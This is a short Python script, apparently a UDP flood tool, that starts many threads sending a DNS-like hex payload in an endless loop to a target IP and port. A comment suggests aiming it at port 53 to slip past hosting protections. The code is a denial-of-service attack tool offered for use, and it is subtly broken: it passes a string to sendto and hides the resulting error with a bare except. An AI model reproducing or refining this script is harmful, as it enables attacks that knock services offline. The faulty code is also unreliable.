import socket
import sys
from threading import Thread

if len(sys.argv) < 3: #making sure all arguments were specified
  sys.exit(f"Syntax: python3 {sys.argv[0]} (ip) (port)")

def send():
  while True: #while true loop to keep the program running
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      s.sendto("000F01000001000000000000026F6B03636F6D0000FF0001", (sys.argv[1], int(sys.argv[2]))) #isn't going to bypass anything, however it's using a dns payload so if they set the dport to 53 it could(not likely) bypass some hostings protection, i don't work with udp so don't expect much for this
    except: #excepting an error to keep the program running
      pass

for i in range(int(sys.argv[3])):
  Thread(target=send).start() #starting the threads
